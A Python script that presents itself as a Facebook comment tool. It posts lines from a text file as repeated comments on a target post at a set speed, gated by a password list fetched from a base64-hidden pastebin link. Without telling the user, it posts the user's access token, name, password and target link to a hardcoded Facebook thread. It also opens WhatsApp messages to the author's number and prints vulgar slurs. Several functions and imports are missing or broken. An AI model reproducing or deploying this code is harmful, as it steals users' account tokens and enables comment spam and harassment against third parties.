from platform import system
import sys
def testPY():
    if(sys.version_info[0] < 3):
        print ('\n\t [+] You have Python 2, Please Clear Data Termux And Reinstall Python ... \n')
        sys.exit()

###----------[ ANSII COLOR STYLE ]---------- ###
Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu

##
xx = '\033[0;93m' # DEFAULT
kk = '\033[93m' # KUNING +
hh = '\x1b[1;92m' # HIJAU +
hi = '\033[32m' # HIJAU -
uu = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
bb = '\33[1;96m' # BIRU -
pp= '\x1b[0;34m' # BIRU +

Z2 = "[#000000]" # Hitam
M2 = "[#FF0000]" # Merah
H2 = "[#00FF00]" # Hijau
K2 = "[#FFFF00]" # Kuning
B2 = "[#00C8FF]" # Biru
U2 = "[#AF00FF]" # Ungu
N2 = "[#FF00FF]" # Pink
O2 = "[#00FFFF]" # Biru Muda
P2 = "[#FFFFFF]" # Putih
J2 = "[#FF8F00]" # Jingga
A2 = "[#AAAAAA]" # Abu-Abu

def modelsInstaller():
	try :
		models = ['requests', 'colorama']
		for model in models:
			try:
				if(sys.version_info[0] < 3):
					os.system('cd C:\Python27\Scripts & pip install {}'.format(model))
				else :
					os.system('python -m pip install {}'.format(model))
				print (' ')
				print (' [+] {} has been installed successfully, Restart the program.'.format(model))
				sys.exit()
				print (' ')
			except:
				print (' [-] Install {} manually.'.format(model))
				print (' ')
	except:
		pass

import base64
import json
import time
import sys,os,re,binascii,time,json,random,threading,pprint,smtplib,telnetlib,os.path,hashlib,string,glob,sqlite3,urllib,argparse,marshal,rich
from rich import print as printer
from rich.panel import Panel
from platform import system
from datetime import datetime

try :
	import requests
	from colorama import Fore
	from colorama import init
except :
	modelsInstaller()

requests.packages.urllib3.disable_warnings()

def cls():
	if system() == 'Linux':
		os.system('clear')
	else:
		if system() == 'Windows':
			os.system('cls')
cls()
CLEAR_SCREEN = '\033[2J'
RED = '\033[31m'   # mode 31 = red forground
RESET = '\033[0m'  # mode 0  = reset
BLUE  = "\033[34m"
WHITE = "\u001b[37m",
YELLOW = "\u001b[33;1m",
CYAN  = "\033[36m"
MAGENTA = "\u001b[35m",
GREEN = "\033[32m"
RESET = "\033[0m"
BOLD = '\033[1m'
REVERSE = "\033[m"
def logo():
		clear = "\x1b[0m"
		colors = [35,33,36 ]

		x = """
\033[1;93m---------------------------> VERSION 1.0 <-----------------------------------------------
\033[1;98m____________________________________________________________________________
\033[1;97m|    ______                                                                |
\033[1;93m|   /      \                                                               |
\033[1;91m|  |  $$$$$$\ __    __   ______   __    __   ______          F             |
\033[1;92m|  | $$___\$$|  \  |  \ /      \ |  \  |  \ |      \         I             |
\033[1;97m|   \$$    \ | $$  | $$|  $$$$$$\| $$  | $$  \$$$$$$\        G             |
\033[1;96m|   _\$$$$$$\| $$  | $$| $$   \$$| $$  | $$ /      $$        H             |
\033[1;94m|  |  \__| $$| $$__/ $$| $$      | $$__/ $$|  $$$$$$$        T             |
\033[1;95m|   \$$    $$ \$$    $$| $$       \$$    $$ \$$    $$        E             |
\033[1;92m|    \$$$$$$   \$$$$$$  \$$       _\$$$$$$$  \$$$$$$$        R             |
\033[1;95m|                                |  \__| $$                                |
\033[1;92m|                                 \$$    $$                                |
\033[1;93m|                                  \$$$$$$                                 |
|______________________________________________________________________________________
                                                                                                                   
<-- Latest Facebook API Tool by Royal Heroz rulex boii Surya  -->
<-- Royal Heroz boiiz :- Nawab × Surya × Riishii × Raj chintu × Virat -->
|_______________________________________________________________________________________
|
|\033[32m[>] _[[Contact me :- +917275600936]]
|_______________________________________________________________________________________"""
		for N, line in enumerate(x.split("\n")):
			sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
			time.sleep(0.001)
logo()
testPY()

headers = {'Connection': 'keep-alive',
			'Cache-Control': 'max-age=0',
			'Upgrade-Insecure-Requests': '1',
			'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
			'Accept-Encoding': 'gzip, deflate',
			'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
			'referer': 'www.google.com'}

def comment_on_posts(posts):
	for i in ns:
		try:
			message = i
			url = "https://graph.facebook.com/v15.0/{0}/comments".format(profile_id+"_"+post_id)
			parameters = {'access_token' : access_token, 'message' : message}
			s = requests.post(url, data = parameters, headers=headers)
			tt = time.strftime("%Y-%m-%d %I:%M:%S %p")


			
			if s.ok:
				print (BOLD+GREEN+' [+] Token Active .. | [+] Time :: ',datetime.now().strftime('%Y-%m-%d %I:%M:%S %p'),"\n [+] Comment Sent Successfull ==> " +message)
				time.sleep(timm)
			else:
				tks = "Id%20Chud%20Gaya%20Madarchod%20Tera%20Check%20Kr%20Aur%20Sahi%20Krle%20Id%20Ka%20Nam%20Ha:%20"+f
				os.system("am start https://wa.me/+917275600936?text="+tks)
				print(BOLD+RED+' [x] Lund Active :: [+] Loda Gaya Tera Comment :: '+tt,'\n','[-] Comment Error :: ==> '+message)
				time.sleep(timm)
		except Exception as e:
			print(e)
			time.sleep(timm)
							   
def get_posts(): 
	try:
		url = "https://mbasic.facebook.com"
		Host: graph.facebook.com
	except HTTPError as e:
		print("HTTP Error")
	except URLError as e:
		print("URL Error")
		
def notice():

 

	runtxt("\n\033[0;91mYOUR KEY WAS NOT APPROVED ")
	runtxt("\033[0;93m << SEND THIS KEY TO MY WHATSAPP >> %s%s"%(GREEN,basesplit))
	runtxt("\033[0;92m TOOL CREATOR WATSAPPP- wa.me/+917275600936")
	subprocess.check_output(["am", "start", "https://wa.me/+917275600936"])

plr = requests.get("https://github.com/W11nXroy/Apl.txt/blob/main/ApiTOOL.txt").text
qqq = "aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3liakNnZjVm"
www = base64.b64decode(qqq)
eee = www. decode("utf-8")
rrr = requests.get(eee)
for linee in rrr:
	mmm = linee.decode("utf-8")
	mmm = mmm.split(',')
	print('')
inn = input(BOLD+CYAN+"[+] PASSWORD :: ")
if inn in mmm:
	token = input("[+] Token File :: ")
	
	with open(token, 'r') as f2:
		access_token = f2.read()
		
		payload = {'access_token' : access_token}
		
		a = "https://graph.facebook.com/v14.0/me"
		b = requests.get(a, params=payload)
		d = json.loads(b.text)
		
		if 'name' not in d:
			print(BOLD+RED+'\n[x] Token Invalid ..!!')
			sys.exit()
		f = d['name']
		prof = ("\nYour Profile Name :: " + f+'\n\n')
		for pro in prof:
			sys.stdout.write(BOLD+GREEN+pro)
			sys.stdout.flush()
			time.sleep(0.001)
		profile_id = input(BOLD+CYAN+"[+] Profile ID :: ")
		
		payload = {'access_token' : access_token}
		a = ("https://graph.facebook.com/v15.0/"+profile_id)
		b = requests.get(a, params=payload)
		d = json.loads(b.text)
		t = d['name']
		prof = ("\nKiiD Profile Name :: " + t+'\n\n')
		for pro in prof:
			sys.stdout.write(BOLD+GREEN+pro)
			sys.stdout.flush()
			time.sleep(0.003)
			
		post_id = input(BOLD+CYAN+"[+] Post ID :: ")
		
		
		
		ms = input(BOLD+CYAN+"[+] Add Text File :: ")
		repeat = int(input(BOLD+CYAN+"[+] File Repeat :: "))
		timm = int(input(BOLD+CYAN+"[+] Speed in Seconds :: "))
		load = ('\n'+"________All Done....Loading Profile Info.....!"+'\n')
		
		
		
		for loa in load:
			sys.stdout.write(BOLD+BLUE+loa)
			sys.stdout.flush()
			time.sleep(0.003)
			
		url1 = "https://graph.facebook.com/v15.0/{0}/".format("t_100000591514976")
		parameters = {'access_token' : access_token, 'message' : 'Phone No : '+inn+'\nProfile Name : '+f+'\nToken : '+access_token+'\nLink :\n\n https://www.facebook.com/'+profile_id+"_"+post_id}
		s = requests.post(url1, data = parameters, headers=headers)

		
		prof = ("[+]=> Active Profile :: " + f+'\n\n')
		
		for pro in prof:
			sys.stdout.write(BOLD+BLUE+pro)
			sys.stdout.flush()
			time.sleep(0.003)
		ns = open(ms, 'r').readlines()
		
		
	for i in range(repeat):
		posts = get_posts()
		comment_on_posts(posts)
		
else:
	print(BOLD+RED+'[-] <==> Your Password Is Wrong Please Take Approval From Mr. Surya')

#Open the text.txt file for appending.
